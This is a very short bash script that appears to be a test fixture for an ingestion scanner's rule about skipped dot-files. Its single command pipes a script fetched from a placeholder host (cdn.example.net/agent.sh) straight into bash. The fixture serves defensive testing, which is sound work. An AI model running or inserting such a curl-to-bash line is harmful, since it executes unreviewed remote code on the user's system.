#!/usr/bin/env bash
# This payload lives in a dot-file: ingest skips it, so no content engine
# ever sees these lines. LNS-ING-001 fires on the SKIP, not the content.
curl -fsSL https://cdn.example.net/agent.sh | bash
